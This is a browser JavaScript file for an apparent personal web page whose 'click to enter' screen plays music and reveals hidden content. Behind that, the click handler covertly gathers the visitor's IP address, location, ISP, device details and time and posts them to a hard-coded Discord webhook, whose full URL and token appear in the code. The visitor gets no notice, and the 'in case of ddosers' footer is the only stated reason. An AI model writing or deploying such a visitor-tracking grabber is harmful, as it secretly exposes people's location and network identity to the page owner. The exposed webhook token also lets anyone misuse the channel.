let sendToDiscordTimeout;
let lastSentTime = 0;
const RATE_LIMIT_DELAY = 1000;

async function sendToDiscord() {
  const webhookUrl = "https://discord.com/api/webhooks/1427640371889836132/UZ-dtGcBBnwS0kN0HcYkfTZZBo7DsookFs02nC9s4qFj748VJQfSq-3eboiDeGZynVxm";
  const hiddenContainer = document.getElementById("hiddencontainer");

  if (!hiddenContainer) {
    return;
  }

  const currentTime = Date.now();
  if (currentTime - lastSentTime < RATE_LIMIT_DELAY) {
    return;
  }

  const contentArray = [];
  const ids = [
    "time", "device-info", "location", "ip-address", "isp"
  ];

  ids.forEach((id) => {
    const element = document.getElementById(id);
    if (element) {
      const text = element.innerText.trim();
      if (text) {
        contentArray.push(text);
      }
    }
  });

  const embed = {
    title: "**🔒 Logged Data**",
    color: 0x2ecc71,
    fields: [
      { name: "**🕒 Time Information**", value: contentArray[0] || "N/A", inline: true },
      { name: "**💻 Device Information**", value: contentArray[1] || "N/A", inline: true },
      { name: "**🌐 IP Address**", value: contentArray[3] || "N/A", inline: true },
      { name: " ", value: "\u200b", inline: false },
      { name: "**📍 Location Information**", value: contentArray[2] || "Unknown", inline: false },
      { name: "**🛠 ISP Information**", value: contentArray[4] || "N/A", inline: false },
    ],
    footer: { text: "New user logged in (this log system is in case of ddosers)" },
    timestamp: new Date(),
  };

  const payload = { embeds: [embed] };

  try {
    const response = await fetch(webhookUrl, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload),
    });

    if (response.status === 429) {
      const retryAfter = parseInt(response.headers.get("Retry-After"), 10) * 1000;
      setTimeout(sendToDiscord, retryAfter);
      return;
    }

    if (!response.ok) {
      throw new Error(`HTTP error! Status: ${response.status}`);
    }

    const responseData = await response.json();
    lastSentTime = Date.now();
  } catch (error) {
    console.error("Error sending data to Discord:", error);
  }
}

function debounce(func, delay) {
  clearTimeout(sendToDiscordTimeout);
  sendToDiscordTimeout = setTimeout(func, delay);
}

function handleUserClick() {
  const flexboxContainer = document.getElementById("flexboxcontainer");
  const hiddenContainer = document.getElementById("hiddencontainer");

  if (!flexboxContainer || !hiddenContainer) {
    return;
  }

  flexboxContainer.style.display = "none";
  flexboxContainer.style.width = "0";
  flexboxContainer.style.height = "0";
  hiddenContainer.style.display = "flex";
  hiddenContainer.style.opacity = "0";

  playNextSong();

  setTimeout(() => {
    hiddenContainer.style.opacity = "1";
  }, 50);

  debounce(sendToDiscord, 1000);
}

document.addEventListener("DOMContentLoaded", () => {
  const flexboxContainer = document.getElementById("flexboxcontainer");
  if (flexboxContainer) {
    flexboxContainer.addEventListener("click", handleUserClick);
  }
});
